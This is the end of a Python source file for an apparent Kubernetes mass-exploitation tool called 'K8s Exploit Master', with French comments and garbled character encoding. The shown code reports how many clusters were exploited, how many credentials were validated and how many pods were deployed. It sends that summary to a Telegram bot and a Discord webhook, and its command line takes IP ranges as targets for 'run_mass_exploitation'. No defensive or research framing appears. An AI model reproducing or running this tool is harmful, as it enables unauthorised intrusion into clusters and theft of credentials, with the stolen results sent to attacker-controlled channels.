        total_credentials = sum(len([c for c in r.credentials_found if c.validated]) 
                              for r in results)
        
        summary = f"""ğŸ“Š EXPLOITATION TERMINÃ‰E

âœ… Clusters exploitÃ©s: {len(exploited_clusters)}/{len(results)}
ğŸ”‘ Credentials validÃ©s: {total_credentials}
ğŸ“Š Statistiques:
  â”œâ”€â”€ Clusters scannÃ©s: {self.stats['clusters_scanned']}
  â”œâ”€â”€ Pods dÃ©ployÃ©s: {self.stats['pods_deployed']}
  â”œâ”€â”€ Fichiers explorÃ©s: {self.stats['files_explored']}
  â””â”€â”€ Session: {self.session_id}

Duration: {datetime.utcnow() - self.start_time}"""
        
        print(summary)
        
        # Notifications finales
        if self.telegram_token:
            await self._send_telegram_message(summary)
        if self.discord_webhook:
            await self._send_discord_message(summary)
        
        return results

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ğŸ¯ POINT D'ENTRÃ‰E PRINCIPAL
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

async def main():
    """Point d'entrÃ©e principal du module"""
    
    import argparse
    
    parser = argparse.ArgumentParser(description="ğŸš€ K8s Exploit Master - Autonomous Module")
    
    parser.add_argument('--targets', '-t', nargs='+', 
                       help='Cibles (IPs ou CIDRs)', required=True)
    parser.add_argument('--telegram-token', help='Token Telegram Bot')
    parser.add_argument('--telegram-chat-id', help='Chat ID Telegram')
    parser.add_argument('--discord-webhook', help='URL webhook Discord')
    parser.add_argument('--output', '-o', help='Fichier de sortie JSON')
    
    args = parser.parse_args()
    
    # Initialisation du module
    exploit_master = K8sExploitMaster(
        telegram_token=args.telegram_token,
        telegram_chat_id=args.telegram_chat_id,
        discord_webhook=args.discord_webhook
    )
    
    # Exploitation
    results = await exploit_master.run_mass_exploitation(args.targets)
    
    # Sauvegarde des rÃ©sultats
    json_output = exploit_master.format_results_json(results)
    
    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write(json_output)
        print(f"ğŸ’¾ RÃ©sultats sauvÃ©s: {args.output}")
    else:
        print("\nğŸ“„ RÃ‰SULTATS JSON:")
        print(json_output)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nâ¹ï¸ ArrÃªt demandÃ© par l'utilisateur")
    except Exception as e:
        print(f"âŒ Erreur fatale: {str(e)}")